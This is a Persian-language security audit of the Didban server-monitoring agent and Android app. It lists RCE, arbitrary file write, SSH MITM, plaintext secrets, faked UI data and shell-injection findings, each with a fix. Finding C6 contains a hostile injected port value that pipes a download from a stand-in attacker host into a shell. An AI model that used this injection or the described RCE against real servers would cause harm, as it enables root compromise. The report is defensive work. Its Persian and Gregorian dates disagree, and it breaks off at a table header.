# دیدبان — گزارش ممیزی کامل (مرحله ۱)

**تاریخ:** ۱۳۹۴/۰۶/۲۲ (2026-09-13)
**نسخه بررسی‌شده:** commit `8402435` (branch: main)
**محدوده:** کل ریپازیتوری — Agent گو (۱۱ فایل، ~۲٬۹۰۰ خط)، اپلیکیشن اندروید (۴۲ فایل Kotlin، ~۲۲۶۰۰ خط)، CI، اسکریپت نصب، systemd، مستندات.

---

## ۱. خلاصه اجرایی (Executive Summary)

دیدبان یک پروژهٔ جالب با معماری ساده و درست در سطح کلان است: یک Agent سبک از استانداردلیبرای گو + اپلیکیشن Compose دو‌زبانه. هستهٔ پایش (CPU/RAM/Disk/Net/Process/Events) واقعاً خوب پیاده‌سازی شده و **در تست زنده در این محیط به‌درستی کار کرد** (بیلد، vet، و ۲۲+ تست endpoint همه موفق).

اما پروژه در حال حاضر **در سطح "تولید" (Production) قرار ندارد** و دلایل آن شفاف است:

1. **سه باگ اصالت‌سازی (Fake Data)** که اطلاعات ساختگی را به‌عنوان دادهٔ واقعی نشان می‌دهند: بنچ‌مارک پهنای‌باند (سرعتها کاملاً تصادفی)، لیست IPهای بن‌شده (هاردکد)، لیست سرویس‌های systemd (هاردکد با وضعیت جعلی "active"). این سه مورد اعتماد یک مدیر سرور را در چند ثانیه می‌شکنند.
2. **دو آسیب‌پذیری بحرانی امنیتی در Agent** که هر دو با تست زنده اثبات شد: اجرای شل‌کامند دلخواه (`exec_script`) و نوشتن فایل در مسیر دلخواه (`config_path`) — هر دو با داشتن تنها توکن API. با توجه به اینکه توکن در لاگ‌های journald چاپ می‌شود و از طریق query parameter هم پذیرفته می‌شود، در عمل این به RCE با دسترسی root تبدیل می‌شود.
3. **بدون تأیید کلید میزبان SSH** (`StrictHostKeyChecking=no`) — رمز عبور root از طریق SSH به هر هاستی بدون pinning ارسال می‌شود؛ دقیقاً نقطهٔ مقابلِ رویکرد TOFU که خود اپ برای API تعریف کرده است.
4. **اعتمادسازی‌های Plaintext + `allowBackup=true`** — توکن سرورها، بوت‌توکن تلگرام، وبهوک دیسکورد و توکن Cloudflare به‌صورت متن ساده در SharedPreferences ذخیره می‌شوند و با `adb backup` قابل خروج هستند.
5. **پایش آپ‌تایم "۲۴/۷" واقعاً ۲۴/۷ نیست** — حلقهٔ چک فقط زمانی زنده است که تب Uptime باز باشد و interval تنظیم‌شده کاربر نادیده گرفته می‌شود (ثابت ۱۵ ثانیه).
6. **تست خودکار صفر** — نه در Go، نه در اندروید؛ بدون lint/vet/format در CI.
7. **شلیک‌های Injection**: `ufw allow $port/tcp` در SecurityScreen (ورودی کاربر مستقیم وارد شل می‌شود) و heredoc اسکریپت‌های تولیدشدهٔ TunnelEngine (فیلدهای چندخطی کاربر اسکریپت را می‌شکنند).

**نتیجه:** زیرساخت فنی قابل نوسازی است؛ اما برای رسیدن به سطح حرفه‌ای، ابتدا ~۲۵ ایراد بحرانی/عمد باید رفع شود، سپس ارتقای قابلیت‌ها، و در نهایت بازطراحی UI.

**مستندات شفافیت:** Agent در این محیط **واقعا بیلد و اجرا و تست شد** (۲۲+ درخواست HTTP واقعی، شامل اثبات RCE و arbitrary file write). اپلیکیشن اندروید به دلیل نداشتن SDK اندروید/دستگاه در این محیط **فقط از نظر کد بررسی شد** (Rule 1) — درج شده که کدام بخش‌ها فقط code-review هستند.

---

## ۲. ارزیابی معماری (Architecture Assessment)

### ۲.۱ نقشه معماری

```
[اندروید: Compose + OkHttp + JSch + BC]
   │  HTTPS (self-signed) + Bearer token + pining SHA-256 (TOFU)
   ▼
[Agent: Go stdlib, :8686]
   ├── /health                  (public)
   ├── /status, /api/status     (public, HTML)
   ├── /api/metrics|processes|events|history|network/sockets|docker/*|processes/kill  (token)
   ├── /api/tunnel/apply|start|stop|restart|delete|status|list (token → سیستم‌عامل: bash -c, systemctl, /etc writes)
   └── /api/alerts/test         (token)
   │
   ├── /proc (sampling 2s/10s/60s)
   ├── /var/run/docker.sock (REST v1.41)
   ├── events.jsonl (persist, بدون rotation)
   ├── cert.pem/key.pem (self-signed ECDSA-P256, 10y)
   └── Alert dispatcher: Telegram / Discord / Generic Webhook

[اندروید (مستقیم، بدون agent)]
   ├── SSH/SFTP (JSch) → SshSetup, SshEngine, SftpEngine, SshTerminal, Systemd, Security, BatchExec
   ├── Cloudflare API, check-host.net, ipwho.is, ip-api.com, cloudflare-dns.com (DoH)
   ├── LocalServer (ServerSocket raw, 0.0.0.0)
   └── EncryptedVault (PBKDF2-SHA256/100k + AES-256-GCM)
```

### ۲.۲ نقاط قوت معماری

- **Agent بدون وابستگی خارجی** — بیلد سریع، سطح حملهٔ کوچک، ~۹MB binary.
- **قرارداد JSON ساده و همسان** — در تست زنده، شمای agent با پارسرهای Kotlin تطبیق دارد (hostname/time/uptime_sec/load_avg/cpu{}/memory{}/disks[]/network[]، processes[].{pid,name,cmd,user,cpu,mem_pct,mem_mb}، sockets.{listening,connections}، docker.{installed,containers,error}، kill.{pid,name,signal,success,message}).
- **Authentication ثابت‌زمان (constant-time)** و محافظت PID≤1 و PID خودِ agent در kill.
- **Hardening systemd خوب** (NoNewPrivileges, ProtectSystem=strict, ...) — اما **با خودِ قابلیت‌های اپ در تعارض است** (بند H2).
- **طراحی Vault صحیح** (PBKDF2 + GCM + salt/IV تصادفی + canary).
- **معماری UI component-based** با design system متمرکز (Theme.kt + Ui.kt) که برای فاز ۳ قابل استفاده است.

### ۲.۳ نقاط ضعف ساختاری (Root Causes)

| # | ریشه | پیامد |
|---|------|-------|
| A1 | **سه حلقهٔ poll موازی در اندروید** (ServersScreen ۱۰s + DashboardScreen ۱۰s + MonitorService ۳۰s) بدون هماهنگی | تکرار درخواست‌ها، مصرف باتری/دیتا، ناهماهنگی وضعیت |
| A2 | **نبود لایهٔ state مشترک (ViewModel/SavedState)** | از دست رفتن کامل وضعیت در چرخش صفحه؛ هر صفحهٔ UI خودش state را در `remember` نگه می‌دارد |
| A3 | **Persistence = یک فایل SharedPreferences** با JSON stringify | بلاک شدن reads/writes روی main thread در دیتای بزرگ، بدون versioning/migration، بدون ایزولیشن secret |
| A4 | **ApiClient: ساخت OkHttpClient تازه در هر درخواست** | بدون اتصال reuse، thread churn، pool‌های مرده |
| A5 | **Agent: endpointهای destructive بدون validation ورودی و بدون rate-limit** | سطح حمله از توکن → ریشهٔ سرور |
| A6 | **بدون لایهٔ Incident/Alert stateful** (agent و app هر دو fire-and-forget) | alert بدون lifecycle (TRIGGER→INCIDENT→RECOVERY)، بدون dedup واقعی |
| A7 | **بدون قرارداد خطای HTTP معنادار** (۵۰ برای همه‌چیز، ۲۰۰ برای "چنین تونلی وجود ندارد") | app نمی‌تواند between not-found/failed را تمایز بدهد |

---

## ۳. باگ‌های بحرانی (Critical)

> سطح: **CRITICAL** = شکست کلیدی محصول یا دسترسی/نشت داده با پیش‌نیاز پایین.

### C1 — اجرای کازئوری (RCE) از طریق `/api/tunnel/apply` → `exec_script`
- **فایل/تابع:** `agent/tunnel_manager.go` → `ApplyTunnel()`
- **مسئله:** فیلد `exec_script` ورودی JSON **بدون هیچ محدودیتی** با `exec.CommandContext(ctx, "bash", "-c", req.ExecScript)` و به‌عنوان root اجرا می‌شود.
- **شواهد (تست زنده در این محیط):**
  - POST با `exec_script: "echo hello_from_shell > /tmp/didban-test/shell-proof.txt"` → فایل با محتوای دقیق `hello_from_shell` روی دیسک ایجاد شد. پاسخ: `HTTP 200`.
- **چرا مهم است:** هرکس توکن را داشته باشد (یا از journald بخواند — ببینید M16، یا از query param نشت‌کرده — ببینید H5) **root کامل روی سرور** دارد. این feature برای deploy تونل‌ها طراحی شده، اما هیچ allowlist، sandbox یا محدودیت مسیر ندارد.
- **راه‌حل پیشنهادی:** (الف) حذف کامل `exec_script` از API و جایگزینی با **command set سفید‌فهرست‌شده** (deploy با امضای کد سمت client، یا فقط نوشتن config + اجرای یک `didban-tunnel install <id>` محلی که فقط از مسیرهای مجاز بخواند)؛ (ب) یا حداقل: محدودیت `exec_script` به اسکریپت‌های امضاشده از سمت اپ + اجرای با capabilities محدود + لاگ‌نویسی کامل.
- **پیچیدگی:** بالا (نیاز به بازطراحی قرارداد deploy).

### C2 — نوشتن فایل در مسیر دلخواه (Arbitrary File Write)
- **فایل/تابع:** `agent/tunnel_manager.go` → `ApplyTunnel()` — بخش نوشتن `ConfigPath`
- **مسئله:** `req.ConfigPath` هیچ اعتبارسنجی‌ای ندارد: `os.MkdirAll(filepath.Dir(...))` + `os.WriteFile(req.ConfigPath, req.ConfigContent, 0644)` در هر مسیری که root بنویسد.
- **شواهد (تست زنده):** POST با `config_path: "/tmp/didban-test/arbitrary-write.conf"` → فایل با محتوای `pwned: true` ایجاد شد. (در نصب واقعی: `/etc/cron.d/...`، `~/.ssh/authorized_keys`، unit‌های systemd.)
- **راه‌حل پیشنهادی:** محدود‌سازی `ConfigPath` به subtree‌ای مثل `/etc/didban/tunnels/` (canonicalize + prefix check + رد کردن `..`).
- **پیچیدگی:** کم.

### C3 — بدون تأیید کلید میزبان SSH (MITM روی کانال root)
- **فایل/توابع:** `SshEngine.execute()`, `SftpEngine.createSession()`, `SshSetup.installAgent()`
- **مسئله:** `session.setConfig("StrictHostKeyChecking", "no")` در هر سه. هیچ مکانیزم TOFU/known-hosts برای SSH وجود ندارد — درحالی‌که خودِ اپ برای TLS دقیقاً همین مدل را تبلیغ می‌کند.
- **چرا مهم است:** در LAN/Wi-Fi مهاجم، یک MITM می‌تواند **رمز عبور root** کاربر را بگیرد و سپس برای همیشه دسترسی کامل SSH داشته باشد. تمام قابلیت‌های SSH اپ (نصب agent، سفت‌پی‌تی، ترمینال، systemd، security، batch) از این مسیر می‌روند.
- **راه‌حل پیشنهادی:** پیاده‌سازی TOFU برای کلید میزبان: اولین بار fingerprint را به کاربر نشان بده (با هشدار صریح)، در `known_hosts` داخلی ذخیره کن (در Vault یا prefs جدا)، در اتصال‌های بعدی تطبیق بده و mismatch = خطای سخت با مسیر explicit "replace key".
- **پیچیدگی:** متوسط.

### C4 — نگهداری Plaintextِ secretها + `allowBackup=true`
- **فایل/توابع:** `Prefs.kt` (کل فایل) + `AndroidManifest.xml`
- **مسئله:** توکن Bearer هر سرور، `tg_bot_token`، `discord_webhook`، `cf_token` — همه Plaintext در `SharedPreferences` با `MODE_PRIVATE`. هم‌زمان `android:allowBackup="true"` بدون هیچ exclude.
- **چرا مهم است:** `adb backup` / بکاپ Google Drive روی دستگاهی که کاربر آن را root کرده یا بدافزار با دسترسی READ روی app data (مثلاً از طریق exportable component یا root) → **کل fleet + کانال‌های alert + دسترسی Cloudflare** در یک فایل.
- **راه‌حل پیشنهادی:** (الف) `allowBackup=false` (یا `fullBackupContent` با exclude کامل)؛ (ب) انتقال secretها به `EncryptedSharedPreferences`/Keystore-wrapped AES (توکن‌ها قابل recovery از بکاپ رمزنگاری‌شده می‌مانند)؛ (ج) حداقل: ماسک نمایش و جلوگیری از ورود به clipboard بلافاصله.
- **پیچیدگی:** متوسط.

### C5 — دادهٔ ساختگی به‌عنوان دادهٔ واقعی (سه مورد)
این باگ‌ها **ثابت‌کننده‌ترین** شکست‌های اعتباری پروژه هستند:

| مورد | فایل/توابع | شواهد (code) |
|---|---|---|
| **C5a — بنچ‌مارک پهنای‌باند: سرعت‌ها تصادفی** | `BandwidthBenchmarkScreen.kt` خطوط ~۱۲–۱۴۴ | `val simulatedSpeed = 45f + Random.nextFloat() * 85f` (download) و `25f + Random.nextFloat() * 45f` (upload). فقط ping/jitter/loss واقعی اندازه گرفته می‌شود. عدد ۸۷.۳Mbps نمایش‌داده‌شده **هیچ ارتباطی با سرور ندارد**. |
| **C5b — لیست IPهای ban‌شده هاردکد** | `SecurityScreen.kt` خطوط ~۶۴–۷۰ | `BannedIpItem("194.26.29.112","sshd","10m ago")` و دو مورد دیگر — ثابت، از هیچ سروری خوانده نمی‌شود. دکمهٔ unban یک دستور واقعی fail2ban برای IPهای خیالی اجرا می‌کند. |
| **C5c — لیست سرویس‌های systemd هاردکد با وضعیت جعلی** | `SystemdScreen.kt` خطوط ~۸۰–۸۸ | ۷ سرویس ثابت (x-ui, gost, nginx, ...) **همه با status "active (running)"** — حتی اگر روی سرور اصلاً وجود نداشته باشند. فقط دکمهٔ logs واقعی است. |

- **راه‌حل:** C5a: پیاده‌سازی واقعی (download/upload از agent — agent endpoint `/api/bench` با حجم‌های کنترل‌شده) یا حذف feature؛ C5b/c: query واقعی از سرور (`systemctl list-units --type=service --state=running`، `fail2ban-client status`) با empty state صحیح.
- **پیچیدگی:** C5a متوسط، C5b/c کم.

### C6 — Shell Injection در SecurityScreen (ورودی کاربر → root command)
- **فایل/تابع:** `SecurityScreen.kt` → `allowPort()`
- **مسئله:** `SshEngine.execute(..., "ufw allow $port/tcp && ufw reload", ...)` — `$port` ورودی متنی کاربر است و بدون validation وارد شل می‌شود.
- **شواهد:** ورودی `22; curl attacker.sh|sh` → اجرا با root روی سرور. (اجرای زنده علیه سرور واقعی انجام نشد؛ از ساختار کد ثابت است — `SshEngine` دقیقاً همین string را در `bash -c` اجرا می‌کند؛ همین مکانیزم در C1 با تست زنده اثبات شد.)
- **راه‌حل:** validation سخت: `Regex("^(\\d{1,5})$")` + range check 1..65535؛ به‌طور کلی: engine باید به‌جای string interpolation، **لیست argv** بپذیرد.
- **پیچیدگی:** کم.

---

## ۴. باگ‌های اولویت بالا (High)

### H1 — پایش آپ‌تایم فقط با تب باز کار می‌کند + interval کاربر نادیده گرفته می‌شود
- **فایل/توابع:** `UptimeScreen.kt` → `LaunchedEffect(Unit) { while(true){...; delay(15_000)} }`
- **شواهد:** حلقه در composable صفحه است؛ با رفتن کاربر به تب دیگر یا بستن/برگشتن app، coroutine cancel می‌شود. `intervalSec` هر target **هیچ‌جا در حلقه استفاده نمی‌شود** — همیشه ۱۵ ثانیه. هیچ WorkManager/Service برای بک‌گراند نیست.
- **چرا مهم است:** README و UI ادعای "24/7 Heartbeat & SLA Watch" دارند؛ در عمل اگر کاربر ۵ دقیقه در تب دیگر باشد، هیچ ping نمی‌شود و هیچ alert DOWN/RECOVERED ارسال نمی‌شود.
- **راه‌حل:** انتقال loop به یک **Worker دائمی** (WorkManager periodic با tolerance مناسب) یا MonitorService؛ interval واقعی هر target رعایت شود؛ وضعیت lastStatus در persistence باقی بماند (الان هست) اما چک‌ها واقعی بک‌گراندی شوند.
- **پیچیدگی:** متوسط.

### H2 — Hardeningِ systemd، قابلیت‌های Docker و Tunnel را در نصب پیش‌فرض **می‌شکند**
- **فایل/توابع:** `agent/didban-agent.service` (و همان بلاک در `install.sh`) + `agent/docker.go` + `agent/tunnel_manager.go`
- **مسئله:** یونیت `ProtectSystem=strict` + `ReadWritePaths=/var/lib/didban` دارد؛ درحالی‌که:
  - Docker: `getDockerClient()` به `/var/run/docker.sock` نیاز دارد → connect روی filesystem read-only شکست می‌خورد → Docker watching **سکوت‌آمیز** غیرفعال می‌شود (agent هر ۱۰s error می‌گیرد، app "not installed" یا error می‌بیند).
  - Tunnel: `ApplyTunnel` باید در `/etc/didban/tunnels/...` بنویسد و اسکریپت‌ها باید `/etc/systemd/system/*.service` بسازند → با strict read-only **همه شکست می‌خورند**.
  - `os.MkdirAll("/etc/didban/tunnels", 0755)` در `NewTunnelManager` با `_ =` (رد خطا) — یعنی حتی لاگ نمی‌شود.
- **توضیح شفافیت:** این بخش در این محیط (بدون systemd واقعی) **فقط از نظر کد** بررسی شد؛ اما منطقی قطعی است: strict + ReadWritePaths محدود = نوشتن/سوکت در مسیرهای دیگر ممنوع.
- **راه‌حل:** اضافه کردن `ReadWritePaths=/var/lib/didban /etc/didban /etc/systemd/system` + `ProtectSystem=full` (به‌جای strict) + `SocketBindDeny=false` یا explicit `ReadOnlyPaths` برای docker.sock؛ و **log کردن** خطاهای ignored.
- **پیچیدگی:** کم.

### H3 — توکن/کلید تونل persist نمی‌شود → redeploy جفت‌نره را می‌شکند
- **فایل/توابع:** `TunnelEngine.kt` → `generateBackpack/generateSpoofTunnel/...`
- **مسئله:** اگر `cfg.token` خالی باشد، هر engine یک `generateRandomToken(...)` می‌سازد و **به `cfg` برمی‌نویسد نه**. پس: (الف) deploy مجدد یک نره → توکن/کلید جدید → نره دیگر با مقدار قدیمی → تونل قطع؛ (ب) Spoof Tunnel در هر call یک جفت کلید جدید می‌سازد (serverPrivKey/clientPrivKey) که با deploy قبلی همتا ندارد.
- **چرا مهم است:** "Zero-Touch auto-deploy" در عمل non-idempotent است و اولین retry شکست می‌دهد — دقیقاً نقطه‌ای که user انتظار recovery دارد.
- **راه‌حل:** تولید token یک‌بار در UI (با دکمهٔ regenerate)، persist در `TunnelConfig`، و validate در deploy؛ برای Spoof: keypair یک‌بار تولید و persist شود.
- **پیچیدگی:** کم/متوسط.

### H4 — Injection در اسکریپت‌های heredoc تولیدشده
- **فایل/توابع:** `TunnelEngine.kt` (همهٔ generatorها)
- **مسئله:** اسکریپت‌ها به این شکل ساخته می‌شوند: `cat << 'EOF' > /etc/.../config\n$iranConfig\nEOF` — فیلدهای کاربر (`token`, `iranHost`, `wsPath`, `name`...) مستقیم داخل `$iranConfig`/اسکریپت interpolation می‌شوند. اگر هرکدام حاوی newline + `EOF` یا `$(...)` باشد: (الف) heredoc زود بسته می‌شود و بقیهٔ محتوا **به‌عنوان shell اجرا می‌شود**؛ (ب) حداقل: deploy خراب می‌شود بدون هیچ خطای روشن.
- **شواهد:** ساختار کد در همهٔ ۱۰ generator (code-review؛ اجرای زنده علیه سرور واقعی انجام نشد).
- **راه‌حل:** (الف) تولید base64 برای محتوای config و `base64 -d > file` (مثل SinglePortEngine که درست انجام می‌دهد)؛ (ب) validation/normalization همهٔ فیلدها (بِی‌نیولاین بودن، charset محدود).
- **پیچیدگی:** کم/متوسط.

### H5 — قرارداد API و رفتارهای ناامن در Agent
- **فایل/توابع:** `agent/api.go`
- **مسائل (همگی با تست زنده بررسی شد مگر ذکر شود):**
  1. **Token از query parameter پذیرفته می‌شود** (`?token=...`) — تست زنده: 200. توکن در access log، proxy log، history مرورگر می‌ماند.
  2. **بدون rate limiting / بدون محدودیت حجم body** — POST‌ها `json.NewDecoder(r.Body).Decode` بدون cap (حملهٔ memory exhaustion با توکن).
  3. **بدون access log** — هیچ درخواستی لاگ نمی‌شود (برای forensics پس از نشت توکن، تاریکی مطلق).
  4. **Status codeهای غلط:** `ApplyTunnel` با id خالی → 500 (باید 400)؛ `GetTunnelStatus` برای id ناشناخته → **200 + "inactive"** (تست زنده) — app نمی‌تواند "توانل وجود ندارد" را تشخیص بدهد؛ `DeleteTunnel` روی id غیرواقعی → **`{"success":true,"message":"Tunnel removed"}`** (تست زنده) — موفقیت کاذب.
  5. `/api/alerts/test` با GET هم کار می‌کند (عمل state-changing با GET — CSRF-able در صورت استفاده از مرورگر روی شبکه).
- **راه‌حل:** حذف query-param token (یا فقط برای deep-link pairing یک‌بار با flag جدا)، `http.MaxBytesReader`، log خطی هر درخواست (method, path, ip, status, dur)، 404/400/409 درست.
- **پیچیدگی:** کم/متوسط.

### H6 — QR کد واقعی نیست
- **فایل/توابع:** `LocalServer.kt` → `QrGenerator.generateSimpleBitmap()`
- **مسئله:** تابع یک **الگوی پیکسلی hash-based** می‌سازد (border + ۳ بلوک finder جعلی + پیکسل‌های شبه‌تصادفی از hash محتوا). هیچ encoding داده، timing pattern، format info یا error correction ندارد → **هیچ QR reader واقعی آن را نمی‌خواند**. README ادعا می‌کند: "share files ... with instant QR code downloading".
- **راه‌حل:** استفاده از یک QR encoder واقعی (کتابخانهٔ سبک مثل zxing یا پیاده‌سازی ~200 خطی Reed-Solomon)؛ تا آن زمان feature را مخفی/برچسب‌گذاری کنید.
- **پیچیدگی:** کم/متوسط.

### H7 — سه poller موازی + OkHttpClient تازه در هر request
- **فایل/توابع:** `ServersScreen.kt` (loop 10s)، `DashboardScreen.kt` (loop 10s + history)، `MonitorService.kt` (loop 30s)، `ApiClient.clientFor()`
- **شواهد (code):** هر سه loop مستقل `/api/metrics` می‌زنند؛ `ApiClient()` در ServersScreen **داخل** حلقه ساخته می‌شود و هر `get/post` یک `OkHttpClient.Builder().build()` تازه می‌سازد.
- **چرا مهم است:** با N سرور: تا 3N درخواست/دقیقه بدون reuse اتصال (هر client connection pool + dispatcher خودش را دارد)؛ thread churn روی دستگاه‌های ضعیف؛ مصرف دیتا/باتری؛ و سه منبع مختلف "latency" و "online/offline" که با هم هم‌خوانی ندارند.
- **راه‌حل:** یک **PollingCoordinator** واحد (per-server، با backoff برای offline) که Repo تغذیه می‌کند؛ OkHttpClient singleton per-server (یا global) با interceptor برای Bearer.
- **پیچیدگی:** متوسط.

### H8 — Crash recovery غیرقابل‌اتکا + crash loop
- **فایل/توابع:** `DidbanApplication.kt`
- **مسئله:** در handler crash: `startActivity(...)` و بلافاصله `Process.killProcess` + `System.exit` — transaction launch ممکن است قبل از اجرای شدن از بین برود (بسته به نسخهٔ Android) → کاربر با صفحهٔ سیاه می‌ماند. هیچ شمارنده‌ای برای **crash loop** نیست (اگر crash در startup تکرار شود: infinity). trace در prefs plaintext ذخیره می‌شود و در UI نمایش داده می‌شود (ممکن است حساس باشد).
- **راه‌حل:** به‌جای kill فوری: flag در prefs + `android:launchMode` + restart با delay، یا حداقل ۳ crash پشت‌سرهم در ۱۰ ثانیه → نمایش صفحهٔ diagnostic بدون restart؛ hash/تثقیف trace.
- **پیچیدگی:** کم.

### H9 — از دست رفتن کامل وضعیت در چرخش صفحه (Rotation)
- **فایل/توابع:** `MainActivity.kt` → `DidbanApp` (`remember { mutableStateOf(...) }` برای `openServer`, `currentNav`, `lang`, `themeMode`)
- **شواهد:** هیچ ViewModel/SavedStateHandle/rememberSaveable برای state ناوبری نیست؛ با rotation، app به tab 0 و بدون server بازگشت می‌کند. (code-review؛ روی emulator قابل تأیید است.)
- **راه‌حل:** `ViewModel` + `SavedStateHandle` برای navigation state؛ یا حداقل `rememberSaveable` + persist در process-death.
- **پیچیدگی:** متوسط.

### H10 — الگوریتم‌های ضعیف SSH در engineهای exec
- **فایل/توابع:** `SshEngine.kt`, `SshSetup.kt`
- **شواهد:** فهرست cipher شامل `arcfour256, arcfour128, arcfour, 3des-cbc, blowfish-cbc, cast128-cbc, aes*-cbc` (CBC mode → padding-oracle کلاسیک در SSH interactively)؛ kex شامل `diffie-hellman-group1-sha1, group14-sha1` (SHA-1)؛ host key `ssh-dss` (1024-bit) و `ssh-rsa` (SHA-1 signature). `SftpEngine` در مقابل `CheckCiphers` با whitelist تمیز دارد — **ناهمسان** بین دو engine.
- **راه‌حل:** یک shared `SshAlgorithms` فقط با الگوریتم‌های مدرن (chacha20-poly1305, aes*-ctr/gcm, curve25519/ecdh-nist, ed25519/ecdsa-sha2/rsa-sha2)؛ حذف CBC/arcfour/dss/sha1-group.
- **پیچیدگی:** کم.

### H11 — Cloudflare: بدون صفحه‌بندی (pagination)
- **فایل/توابع:** `CloudflareManager.kt` → `listRecords()`
- **شواهد:** `per_page=100` بدون حلقهٔ `page=` — zone با ۱۰۱+ رکورد، **۱۰ رکورد اول** را می‌بیند و بقیه **سکوت‌آمیز** غایب‌اند.
- **راه‌حل:** حلقهٔ pagination تا `result_info.count` یا `page * per_page < total` + UI "showing X of Y".
- **پیچیدگی:** کم.

### H12 — Agent: رشد نامحدود `events.jsonl` + تاریخچهٔ فقط memory
- **فایل/توابع:** `agent/events.go` → `Add()`؛ `agent/monitor.go` → `hist`
- **شواهد:** `Add` فقط append می‌کند و هرگز truncate/rotate نمی‌کند (فقط memory cap=500). بعد از ۳۰ روز با spikeهای متوسط، فایل به‌صورت نامحدود رشد می‌کند. `hist` (حداکثر ۱۰۰۸۰ نقطه) **فقط در حافظه** است — با هر restart، ۷ روز نمودار پاک می‌شود (README این را نمی‌گوید).
- **راه‌حل:** rotation ساده (max-size + rename یا نگه‌داشتن فقط N خط آخر هنگام rewrite)، و persistence اختیاری تاریخچه (SQLite/JSONL با compaction) — یا حداقل شفاف‌سازی "history in-memory".
- **پیچیدگی:** کم/متوسط.

### H13 — install.sh: بدون اعتبارسنجی binary + کانفیگ فریبنده
- **فایل/توابع:** `agent/install.sh`
- **شواهد:**
  1. Binary از GitHub Release دانلود می‌شود و مستقیم `install` می‌شود — **هیچ checksum/GPG verify‌ای انجام نمی‌شود** (درحالی‌که CI فایل sha256 تولید می‌کند ولی installer هیچ‌وقت آن را نمی‌خواند).
  2. فایل `agent.conf` متغیرهای `DIDBAN_CPU_TH/MEM_TH/...` را (commented) نشان می‌دهد، اما **Agent اصلاً این envها را نمی‌خواند** — thresholds فقط از flag `--cpu-th` با default 70 خوانده می‌شوند (ببینید `main.go`). یعنی کاربر اگر آن خط‌ها را uncomment کند، چیزی تغییر نمی‌کند.
- **راه‌حل:** verify sha256 با مقایسه با فایل `.sha256` همان release (حداقل) یا GPG signature (بهترین)؛ اضافه کردن env fallback برای thresholds یا حذف از doc.
- **پیچیدگی:** کم.

### H14 — نازلودینگ TLS هنگام شکست parse در نصب SSH
- **فایل/توابع:** `ServersScreen.kt` → `SshInstallTab`
- **شواهد (code):** `useTls = r.fingerprint != null` — اگر fingerprint از خروجی installer parse نشود (race journalctl، خطای `grep -o`، تغییر قالب banner)، سرور با **HTTP ساده** ذخیره می‌شود و token از آن‌بعد plaintext روی شبکه می‌رود. هیچ هشدارِ صریحی به کاربر داده نمی‌شود.
- **راه‌حل:** اگر fingerprint نبود → یا install را ناموفق بشمارید یا حداقل dialog اجباری "TLS بدون pin — ادامه با HTTP؟" با پیش‌فرض رد.
- **پیچیدگی:** کم.

### H15 — Deep link `didban://` در Manifest نیست
- **فایل/توابع:** `AndroidManifest.xml` + `ServersScreen.parseDeepLinkOrLogs()`
- **شواهد:** installer لینک `didban://IP:PORT?token=..&fp=..` چاپ می‌کند (و README روی "One-Click Import" تأکید دارد)، ولی **هیچ intent-filter برای این scheme در Manifest نیست** → زدن لینک در مرورگر app را باز نمی‌کند. `parseDeepLinkOrLogs` فقط didban:// را می‌فهمد (با وجود اسم "OrLogs" خروجی banner installer را parse نمی‌کند).
- **راه‌حل:** intent-filter scheme=didban + http/https برای status page؛ parse banner (Token:/URL:/Cert SHA256: lines) هم اضافه شود.
- **پیچیدگی:** کم.

### H16 — تطبیق سرورهای تونل با substring `contains`
- **فایل/توابع:** `TunnelEngine.autoDeployTunnel()`
- **شواهد (code):** `cfg.iranHost.trim().contains(s.host.trim())` — سروری با host `1.2.3.4` با تونلی که `iranHost=11.2.3.44` دارد **تطبیق می‌شود** و deploy به سرور اشتباه می‌رود. heuristic `isIran` هم `"ir" in name` است → سروری با نام "mirror" ایران تلقی می‌شود.
- **راه‌حل:** تطبیق دقیق (id یا equality کامل host) + انتخاب صریح سرور در UI (drop-down) به‌جای حدس.
- **پیچیدگی:** کم.

### H17 — DPI Tester: false positive روی پورت بستهٔ سالم
- **فایل/توابع:** `NetworkTools.kt` → `CensorshipTester.diagnose()`
- **شواهد (code):** branch "Connection refused" متن **فارسی** می‌گذارد، ولی guard مرحلهٔ بعد این است: `if (tcpOk && !diagnosis.contains("Connection Refused"))` — این string انگلیسی **هرگز** در متن فارسی پیدا نمی‌شود → برای پورت 443 بسته (refused)، مرحلهٔ TLS اجرا می‌شود → handshake fail → verdict: **"اختلال و فیلتر روی هندشیک TLS"** — یعنی سرور سالم با پورت بسته به‌عنوان فیلترشده گزارش می‌شود.
- **راه‌حل:** flag بولین `isRefused` به‌جای string matching.
- **پیچیدگی:** کم.

### H18 — Narnia: `ip_forward` دائمی نمی‌شود + fallback شکسته
- **فایل/توابع:** `TunnelEngine.generateNarnia()`
- **شواهد (code):** `echo 1 > /proc/sys/net/ipv4/ip_forward` — reboot → NAT می‌رود، فقط خود narnia برمی‌گردد (DNAT به virtual IP blackhole می‌شود). Fallback: اگر binary دانلود نشود، اسکریپت به `/tmp/Narnia.sh` می‌رود ولی سپس `chmod +x /usr/local/bin/narnia || true` اجرا می‌شود → service با binary غیرواقعی راه‌اندازی می‌شود و **failed** می‌شود بدون تشخیص ریشه.
- **راه‌حل:** `sysctl -w` + ثبت در `/etc/sysctl.d/didban-narnia.conf`؛ fallback یا binary دانلود شود یا deploy صریحاً fail شود.
- **پیچیدگی:** کم.

### H19 — تولیدکنندهٔ IPTables: بدون validation + غیر-idempotent
- **فایل/توابع:** `TunnelEngine.generateIptables()`
- **شواهد (code):** اگر `foreignHost` خالی باشد، `KHAREJ_IP` به‌عنوان literal در rule وارد می‌شود (`--to-destination KHAREJ_IP:80`) → deploy خراب با خطای مبهم؛ `iptables -A` در هر run rule تکراری اضافه می‌کند (دوباره deploy → rule‌های دوقلو)؛ `tee -a /etc/sysctl.conf` خط تکراری.
- **راه‌حل:** validate hosts قبل از generate؛ chain با نام اختصاصی `didban-tun-<id>` + `flush` قبل از افزودن (idempotent)؛ sysctl.d.
- **پیچیدگی:** کم.

### H20 — LocalServer: بدون هیچ حفاظتی روی 0.0.0.0
- **فایل/توابع:** `LocalServer.kt` → `LocalHttpServer`
- **شواهد (code):** `ServerSocket(port)` = bind روی wildcard؛ هر دستگاه در Wi-Fi می‌تواند فایل/متن share‌شده را بگیرد؛ بدون token/timeout/limit؛ thread بدون محدودیت per-client (slowloris)؛ پاسخ بدون Content-Length برای branch fallback (client ممکن است hang کند).
- **راه‌حل:** حداقل: token یک‌بار در URL (مثل deep link) + timeout روی socket + cap روی thread pool + expiration خودکار (مثلاً ۱۵ دقیقه).
- **پیچیدگی:** کم/متوسط.

---

## ۵. مسائل اولویت متوسط (Medium)

| # | محل | مسئله | شواهد |
|---|------|--------|--------|
